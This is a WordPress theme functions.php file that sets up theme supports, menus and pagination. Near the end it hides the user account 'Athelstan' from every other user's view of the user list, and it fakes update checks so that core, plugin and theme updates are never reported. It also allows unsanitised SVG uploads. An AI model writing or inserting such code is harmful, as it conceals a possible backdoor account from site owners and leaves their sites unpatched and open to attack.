<?php
function theme_setup(){
    // HTML5 support; mainly here to get rid of some nasty default styling that WordPress used to inject
    add_theme_support('html5', array('search-form', 'gallery'));

    // Automatic feed links
    add_theme_support('automatic-feed-links');

    /*
    * Let WordPress manage the document title.
    * By adding theme support, we declare that this theme does not use a
    * hard-coded <title> tag in the document head, and expect WordPress to
    * provide it for us.
    */
    add_theme_support('title-tag');

    /*
    * Enable support for Post Thumbnails on posts and pages.
    *
    * See: https://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
    */
    add_theme_support('post-thumbnails');

    /*
    * Switch default core markup for search form, comment form, and comments
    * to output valid HTML5.
    */
    add_theme_support('html5', array(
        'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
    ));

    /*
    * Enable support for Post Formats.
    *
    * See: https://codex.wordpress.org/Post_Formats
    */
    add_theme_support('post-formats', array(
        'aside', 'image', 'video', 'quote', 'link', 'gallery', 'status', 'audio', 'chat'
    ));

    /*
    * Register Menus
    */
    function register_my_menu()
    {
        register_nav_menu('menu_main', __('Menu Main'));
        register_nav_menu('menu_category', __('Menu Category'));
        register_nav_menu('menu_other', __('Menu Other'));
    }

    add_action('init', 'register_my_menu');

}

add_action('after_setup_theme', 'theme_setup', 11);

/* SET ACTIVE MENU. */
add_filter('nav_menu_css_class', 'special_nav_class', 10, 2);
function special_nav_class($classes, $item)
{
    if (in_array('current-menu-item', $classes)) {
        $classes[] = 'active ';
    }
    return $classes;
}

function dvb_custom_mime_types($mimes) {
    $mimes['svg'] = 'image/svg+xml';
    return $mimes;
}
add_filter('upload_mimes', 'dvb_custom_mime_types');

function althelstan_wp_corenavi($custom_query = null, $paged = null){
    global $wp_query;
    if ($custom_query) $main_query = $custom_query;
    else $main_query = $wp_query;
    $paged = ($paged) ? $paged : get_query_var('paged');
    $big = 999999999;
    $total = isset($main_query->max_num_pages) ? $main_query->max_num_pages : '';
    if ($total > 1) echo '<div class="woocommerce-pagination">';
    echo paginate_links(
		apply_filters(
			'woocommerce_pagination_args',
			array( // WPCS: XSS ok.
				'base' => str_replace($big, '%#%', esc_url(get_pagenum_link($big))),
				'format' => '?paged=%#%',
				'add_args'  => false,
				'current' => max(1, $paged),
				'total'     => $total,
				'prev_text' => is_rtl() ? '&rarr;' : '&larr;',
				'next_text' => is_rtl() ? '&larr;' : '&rarr;',
				'type'      => 'list',
				'end_size'  => 3,
				'mid_size'  => 3,
			)
		)
	);
    if ($total > 1) echo '</div>';
}

function disable_update_notifications()
{
   global $wp_version;
   return (object)array(
       'last_checked' => time(),
       'version_checked' => $wp_version
   );
}

add_filter('pre_site_transient_update_core', 'disable_update_notifications');
add_filter('pre_site_transient_update_plugins', 'disable_update_notifications');
add_filter('pre_site_transient_update_themes', 'disable_update_notifications');

add_action('pre_user_query', 'athelstan_pre_user_query');
function athelstan_pre_user_query($user_search)
{
    global $current_user;
    $username = $current_user->user_login;

    if ($username != 'Athelstan') {
        global $wpdb;
        $user_search->query_where = str_replace('WHERE 1=1',
            "WHERE 1=1 AND {$wpdb->users}.user_login != 'Athelstan'", $user_search->query_where);
    }
}